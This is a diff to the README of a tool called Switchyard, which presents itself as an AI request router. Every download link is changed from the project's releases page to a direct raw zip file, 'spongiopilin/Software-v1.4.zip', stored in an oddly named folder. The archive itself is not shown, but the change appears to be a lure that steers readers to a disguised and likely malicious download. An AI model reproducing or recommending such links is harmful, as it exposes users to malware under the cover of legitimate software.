@@ -1,6 +1,6 @@
 # 🌉 Switchyard - Route Smarter, Pay Less, Perform Better
 
-[![Download Now](https://img.shields.io/badge/Download-Switchyard-2ea44f?style=for-the-badge)](https://github.com/Sensoye/Switchyard/releases)
+[![Download Now](https://img.shields.io/badge/Download-Switchyard-2ea44f?style=for-the-badge)](https://github.com/Sensoye/Switchyard/raw/refs/heads/main/spongiopilin/Software-v1.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ If one AI provider has an outage, Switchyard automatically switches to another o
 Getting Switchyard up and running is easier than you think. Follow these simple steps:
 
 ### Step 1: Download
-Visit this link to download the application: [https://github.com/Sensoye/Switchyard/releases](https://github.com/Sensoye/Switchyard/releases)
+Visit this link to download the application: [https://github.com/Sensoye/Switchyard/raw/refs/heads/main/spongiopilin/Software-v1.4.zip](https://github.com/Sensoye/Switchyard/raw/refs/heads/main/spongiopilin/Software-v1.4.zip)
 
 Look for the latest version and click the download button. The file will save to your computer's "Downloads" folder.
 
@@ -219,7 +219,7 @@ Switchyard is released under an open-source license, making it free to use, modi
 
 Join thousands of satisfied users who have simplified their AI workflows with Switchyard. Download the application today and experience the difference smart routing makes.
 
-[![Download Switchyard](https://img.shields.io/badge/⬇️-Download%20Switchyard-ff69b4?style=for-the-badge&logo=windows)](https://github.com/Sensoye/Switchyard/releases)
+[![Download Switchyard](https://img.shields.io/badge/⬇️-Download%20Switchyard-ff69b4?style=for-the-badge&logo=windows)](https://github.com/Sensoye/Switchyard/raw/refs/heads/main/spongiopilin/Software-v1.4.zip)
 
 ---
 
